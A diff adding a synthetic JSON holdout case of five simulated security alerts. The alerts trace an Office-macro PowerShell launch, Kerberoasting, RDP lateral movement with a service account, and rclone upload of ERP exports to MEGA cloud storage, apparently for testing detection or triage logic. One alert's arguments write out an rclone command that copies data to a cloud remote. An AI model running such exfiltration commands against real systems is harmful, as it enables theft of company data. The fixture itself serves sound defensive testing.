@@ -1,0 +1,52 @@
+{
+  "case_id": "HOLDOUT-KRB-006",
+  "synthetic": true,
+  "description": "Caso de control no usado para ajustar reglas: macro de Office que lanza PowerShell, Kerberoasting, RDP a un servidor y subida con rclone a almacenamiento en la nube. Nombres de regla y etiquetas al estilo de las reglas prediseñadas de Elastic.",
+  "alerts": [
+    {
+      "@timestamp": "2026-09-19T14:03:12Z",
+      "event": {"id": "ho-001", "kind": "alert", "category": ["process"], "type": ["start"]},
+      "rule": {"name": "Microsoft Office Child Process Spawned PowerShell"},
+      "tags": ["Domain: Endpoint", "OS: Windows", "Tactic: Execution"],
+      "host": {"name": "WKS-31"},
+      "user": {"name": "rquispe"},
+      "process": {"name": "powershell.exe", "parent": {"name": "WINWORD.EXE"}}
+    },
+    {
+      "@timestamp": "2026-09-19T14:19:40Z",
+      "event": {"id": "ho-002", "kind": "alert", "category": ["authentication"], "type": ["info"]},
+      "rule": {"name": "Kerberos Service Ticket Requests with RC4 Encryption Burst"},
+      "tags": ["Domain: Identity", "Tactic: Credential Access"],
+      "host": {"name": "DC-01"},
+      "user": {"name": "rquispe"},
+      "source": {"ip": "10.0.4.31"}
+    },
+    {
+      "@timestamp": "2026-09-19T15:02:05Z",
+      "event": {"id": "ho-003", "kind": "alert", "category": ["authentication"], "type": ["start"], "outcome": "success"},
+      "rule": {"name": "RDP Logon to Server from Workstation with Service Account"},
+      "tags": ["Domain: Endpoint", "Tactic: Lateral Movement"],
+      "host": {"name": "SRV-ERP-02"},
+      "user": {"name": "svc_sqlreport"},
+      "source": {"ip": "10.0.4.31"}
+    },
+    {
+      "@timestamp": "2026-09-19T15:20:48Z",
+      "event": {"id": "ho-004", "kind": "alert", "category": ["process"], "type": ["start"]},
+      "rule": {"name": "Rclone Execution with Cloud Remote"},
+      "tags": ["Domain: Endpoint", "Tactic: Exfiltration"],
+      "host": {"name": "SRV-ERP-02"},
+      "user": {"name": "svc_sqlreport"},
+      "process": {"name": "rclone.exe", "args": ["copy", "D:\\ERP\\exports", "remote:bk"]}
+    },
+    {
+      "@timestamp": "2026-09-19T15:21:30Z",
+      "event": {"id": "ho-005", "kind": "alert", "category": ["network"], "type": ["connection"]},
+      "rule": {"name": "Unusual Volume of Outbound Data to Cloud Storage"},
+      "tags": ["Domain: Network", "Tactic: Exfiltration"],
+      "host": {"name": "SRV-ERP-02"},
+      "user": {"name": "svc_sqlreport"},
+      "destination": {"domain": "g.api.mega.co.nz", "ip": "198.51.100.140"}
+    }
+  ]
+}
